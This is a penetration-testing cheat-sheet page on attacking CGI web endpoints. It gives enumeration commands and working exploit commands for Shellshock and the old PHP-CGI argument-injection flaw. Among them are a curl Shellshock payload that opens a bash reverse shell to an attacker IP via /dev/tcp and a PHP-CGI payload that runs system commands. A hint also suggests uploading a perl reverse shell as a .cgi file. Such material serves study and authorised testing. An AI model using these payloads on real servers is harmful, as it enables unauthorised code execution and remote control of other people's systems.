# CGI

## Theory

Common Gateway Interface (CGI) is an interface specification that enables [web servers](https://en.wikipedia.org/wiki/Web\_server) to execute an external program to process HTTP/S user requests.

{% hint style="info" %}
The **CGI scripts are perl scripts**, so, if you have compromised a server that can execute _**.cgi**_ scripts you can **upload a perl reverse shell** (`/usr/share/webshells/perl/perl-reverse-shell.pl`), **change the extension** from **.pl** to **.cgi**, give **execute permissions** (`chmod +x`) and **access** the reverse shell **from the web browser** to execute it.
{% endhint %}

## Practice

{% tabs %}
{% tab title="Enumerate" %}
We can fuzz for CGI endpoints using [CGIs.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/CGIs.txt) and [CGI-Microsoft.fuzz.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/CGI-Microsoft.fuzz.txt) from [SecList](https://github.com/danielmiessler/SecLists/tree/master)

```bash
#Linux
feroxbuster -u http://<TARGET> -w /usr/share/SecList/Discovery/Web-Content/CGIs.txt

#Windows
feroxbuster -u http://<TARGET> -w /usr/share/SecList/Discovery/Web-Content/CGI-Microsoft.fuzz.txt


```

We can test for CGI vulns using nikto

```bash
nikto -h <TARGET> -C all
```
{% endtab %}
{% endtabs %}

### Vulnerabilities

#### ShellShock - CVE-2014-6271

Bash can also be used to run commands passed to it by applications and it is this feature that the vulnerability affects. One type of command that can be sent to Bash allows environment variables to be set. Environment variables are dynamic, named values that affect the way processes are run on a computer. The vulnerability lies in the fact that an **attacker can tack-on malicious code to the environment variable, which will run once the variable is received**.

{% tabs %}
{% tab title="Exploit" %}
If we found the CGI script under **`/cgi-bin/`**, modifying HTTP header to remote code execution.

```bash
#reflected
curl -H 'User-Agent: () { :; }; echo "VULNERABLE TO SHELLSHOCK"' http://<TARGET>/cgi-bin/admin.cgi 2>/dev/null| grep 'VULNERABLE'

#Blind
curl -H 'User-Agent: () { :; }; /bin/bash -c "sleep 5"' http://<TARGET>/cgi-bin/admin.cgi

#reverse shell
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/<ATTACKING_IP>/<PORT> 0>&1' http://<TARGET>/cgi-bin/admin.cgi
```
{% endtab %}
{% endtabs %}

#### **Proxy (MitM to Web server requests)**

{% tabs %}
{% tab title="Exploit" %}
CGI creates a environment variable for each header in the http request. For example: "host:web.com" is created as "HTTP\_HOST"="web.com"

As the HTTP\_PROXY variable could be used by the web server. Try to send a **header** containing: "**Proxy: \<IP\_attacker>:\<PORT>**" and if the server performs any request during the session. You will be able to capture each request made by the server.
{% endtab %}
{% endtabs %}

#### CGI RCE - CVE-2012-1823, CVE-2012-2311

{% tabs %}
{% tab title="Exploit" %}
Basically if cgi is active and php is "old" (**<5.3.12 / < 5.4.2**) you can execute code.\
In order t exploit this vulnerability you need to access some PHP file of the web server without sending parameters (specially without sending the character "=").\
Then, in order to test this vulnerability, you could access for example `/index.php?-s` (note the `-s`) and **source code of the application will appear in the response**.

Then, in order to obtain **RCE** you can send this special query: `/?-d allow_url_include=1 -d auto_prepend_file=php://input` and the **PHP code** to be executed in the **body of the request.**

```bash
curl -i --data-binary "<?php system(\"cat /flag.txt \") ?>" "http://jh2i.com:50008/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input"
```
{% endtab %}
{% endtabs %}

## Resources

{% embed url="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/cgi" %}

{% embed url="https://exploit-notes.hdks.org/exploit/web/cgi-pentesting/" %}

